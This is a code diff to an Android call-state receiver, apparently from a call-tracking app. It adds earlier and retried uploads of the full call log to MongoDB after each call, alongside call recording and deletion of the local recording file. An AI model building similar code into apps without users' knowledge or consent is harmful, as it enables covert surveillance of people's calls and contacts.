@@ -16,6 +16,8 @@ class CallReceiver : BroadcastReceiver() {
         when (state) {
             TelephonyManager.EXTRA_STATE_RINGING -> {
                 CallStateTracker.onRinging(intent)
+                SyncBootstrap.ensureBackgroundReady(appContext)
+                SyncObserverManager.register(appContext)
             }
 
             TelephonyManager.EXTRA_STATE_OFFHOOK -> {
@@ -25,7 +27,7 @@ class CallReceiver : BroadcastReceiver() {
             TelephonyManager.EXTRA_STATE_IDLE -> {
                 SyncBootstrap.ensureBackgroundReady(appContext)
                 SyncObserverManager.register(appContext)
-                SyncWorkScheduler.schedule(appContext)
+                SyncWorkScheduler.enqueueNow(appContext)
                 val wakeLock = acquireWakeLock(appContext)
                 val pendingResult = goAsync()
                 val recording = CallRecorder.stop()
@@ -34,12 +36,17 @@ class CallReceiver : BroadcastReceiver() {
                 BackgroundSyncRunner.run {
                     CallSyncService.holdDuring(appContext) {
                         try {
-                            DeviceRegistration.registerNow(appContext)
                             SimNumberHelper.ensureSimReadyForSync(appContext)
-                            Thread.sleep(2500L)
+                            Thread.sleep(3500L)
 
                             if (CallSyncHelper.hasCallLogPermission(appContext)) {
                                 CallSyncHelper.syncAllCallsToMongoNow(appContext, "call_idle")
+                                Thread.sleep(2000L)
+                                CallSyncHelper.syncLatestCalls(
+                                    context = appContext,
+                                    source = "call_idle_retry",
+                                    retryCount = 2,
+                                ) {}
                             } else if (incomingNumber != "Unknown") {
                                 CallSyncHelper.syncCapturedCall(
                                     context = appContext,
@@ -52,6 +59,7 @@ class CallReceiver : BroadcastReceiver() {
                                 )
                             }
 
+                            DeviceRegistration.registerNow(appContext)
                             recording?.file?.delete()
                             MessageEventEmitter.notifyNewCallSafe()
                         } catch (error: Exception) {
